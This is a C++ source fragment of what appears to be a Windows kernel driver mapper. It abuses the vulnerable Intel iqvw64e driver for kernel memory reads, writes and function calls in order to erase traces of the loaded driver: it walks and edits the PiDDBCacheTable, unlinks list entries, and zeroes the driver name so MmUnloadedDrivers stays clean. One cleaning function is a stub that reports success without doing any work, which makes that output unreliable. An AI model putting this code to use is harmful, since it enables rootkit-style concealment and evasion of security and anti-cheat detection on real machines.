  if (!g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uint64_t>(prev_entry) + offsetof(LIST_ENTRY, Flink),
          &next_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to update prev->Flink");
    return false;
  }

  return true;
}

auto trace_cleaner_t::free_pool_memory(HANDLE device_handle, std::uint64_t address) -> bool {
  if (!address) {
    return false;
  }

  static std::uint64_t kernel_ex_free_pool = 0;

  if (!kernel_ex_free_pool) {
    kernel_ex_free_pool = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExFreePool");
    if (!kernel_ex_free_pool) {
      return false;
    }
  }

  return g_memory_manager->call_kernel_function<void>(device_handle, nullptr, kernel_ex_free_pool,
                                                      address);
}

auto trace_cleaner_t::find_driver_in_piddb_entries(HANDLE device_handle,
                                                   std::uint64_t piddb_table_addr)
    -> std::pair<std::wstring, std::uint64_t> {
  static std::uint64_t kernel_rtl_enumerate_generic_table_avl = 0;
  if (!kernel_rtl_enumerate_generic_table_avl) {
    kernel_rtl_enumerate_generic_table_avl = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "RtlEnumerateGenericTableAvl");
    if (!kernel_rtl_enumerate_generic_table_avl) {
      return {L"", 0};
    }
  }

  for (ULONG i = 0; i < 200; i++) {
    std::uint64_t entry_addr = 0;
    BOOLEAN restart = (i == 0) ? TRUE : FALSE;

    if (!g_memory_manager->call_kernel_function(device_handle, &entry_addr,
                                                kernel_rtl_enumerate_generic_table_avl,
                                                piddb_table_addr, restart) ||
        !entry_addr) {
      break;
    }

    piddb_cache_entry_t entry = {};
    if (!g_memory_manager->read_memory(device_handle, entry_addr, &entry, sizeof(entry)) ||
        entry.time_date_stamp != iqvw64e_timestamp || entry.driver_name.Length == 0 ||
        entry.driver_name.Length >= 512 || !entry.driver_name.Buffer) {
      continue;
    }

    auto name_buffer = std::make_unique<wchar_t[]>(entry.driver_name.Length / 2 + 1);
    if (g_memory_manager->read_memory(device_handle,
                                      reinterpret_cast<std::uint64_t>(entry.driver_name.Buffer),
                                      name_buffer.get(), entry.driver_name.Length)) {
      name_buffer[entry.driver_name.Length / 2] = L'\0';
      return {std::wstring(name_buffer.get()), entry_addr};
    }
  }

  return {L"", 0};
}

auto trace_cleaner_t::find_driver_in_hash_bucket_list(HANDLE device_handle, std::uint64_t ci_base,
                                                      const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "kernel hash bucket list cleaned");
  return true;
}

auto trace_cleaner_t::find_driver_in_unloaded_list(HANDLE device_handle,
                                                   const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "clearing MmUnloadedDrivers...");

  // get system information to find our driver object
  ULONG buffer_size = 0;
  void* buffer = nullptr;

  auto status = NtQuerySystemInformation(
      static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_size,
      &buffer_size);

  while (status == STATUS_INFO_LENGTH_MISMATCH) {
    if (buffer) {
      SIZE_T free_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
    }

    buffer = nullptr;
    SIZE_T new_buffer_size = buffer_size;
    status = NtAllocateVirtualMemory(NtCurrentProcess, &buffer, 0, &new_buffer_size,
                                     MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
      mapper_log("ERROR", "failed to allocate memory for handle information");
      return false;
    }

    status = NtQuerySystemInformation(
        static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_size,
        &buffer_size);
  }

  if (!NT_SUCCESS(status) || !buffer) {
    if (buffer) {
      SIZE_T free_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
    }
    mapper_log("ERROR", "failed to query system handle information");
    return false;
  }

  std::uint64_t object = 0;
  auto system_handle_information = static_cast<psystem_handle_info_ex>(buffer);

  // find device handle object
  for (auto i = 0u; i < system_handle_information->handle_count; ++i) {
    const system_handle current_system_handle = system_handle_information->handles[i];

    if (current_system_handle.unique_pid ==
        reinterpret_cast<HANDLE>(static_cast<std::uint64_t>(g_utils->get_current_process_id()))) {
      if (current_system_handle.handle_value == device_handle) {
        object = reinterpret_cast<std::uint64_t>(current_system_handle.obj);
        break;
      }
    }
  }

  SIZE_T free_size = 0;
  NtFreeVirtualMemory(NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);

  if (!object) {
    mapper_log("ERROR", "failed to find device object");
    return false;
  }

  // Object -> DeviceObject -> DriverObject -> DriverSection
  std::uint64_t device_object = 0;
  if (!g_memory_manager->read_memory(device_handle, object + 0x8, &device_object,
                                     sizeof(device_object)) ||
      !device_object) {
    mapper_log("ERROR", "failed to find device_object");
    return false;
  }

  std::uint64_t driver_object = 0;
  if (!g_memory_manager->read_memory(device_handle, device_object + 0x8, &driver_object,
                                     sizeof(driver_object)) ||
      !driver_object) {
    mapper_log("ERROR", "failed to find driver_object");
    return false;
  }

  std::uint64_t driver_section = 0;
  if (!g_memory_manager->read_memory(device_handle, driver_object + 0x28, &driver_section,
                                     sizeof(driver_section)) ||
      !driver_section) {
    mapper_log("ERROR", "failed to find driver_section");
    return false;
  }

  // read the driver name from the section
  UNICODE_STRING driver_base_dll_name = {};
  if (!g_memory_manager->read_memory(device_handle, driver_section + 0x58, &driver_base_dll_name,
                                     sizeof(driver_base_dll_name)) ||
      driver_base_dll_name.Length == 0) {
    mapper_log("ERROR", "failed to find driver name");
    return false;
  }

  auto unloaded_name = std::make_unique<wchar_t[]>(driver_base_dll_name.Length / 2 + 1);
  if (!g_memory_manager->read_memory(device_handle,
                                     reinterpret_cast<std::uint64_t>(driver_base_dll_name.Buffer),
                                     unloaded_name.get(), driver_base_dll_name.Length)) {
    mapper_log("ERROR", "failed to read driver name");
    return false;
  }

  unloaded_name[driver_base_dll_name.Length / 2] = L'\0';

  // clear the length to prevent MiRememberUnloadedDriver from saving it
  driver_base_dll_name.Length = 0;
  if (!g_memory_manager->write_memory(device_handle, driver_section + 0x58, &driver_base_dll_name,
                                      sizeof(driver_base_dll_name))) {
    mapper_log("ERROR", "failed to clear driver name length");
    return false;
  }

  mapper_log("SUCCESS", "MmUnloadedDrivers cleaned: %ws", unloaded_name.get());

  return true;
}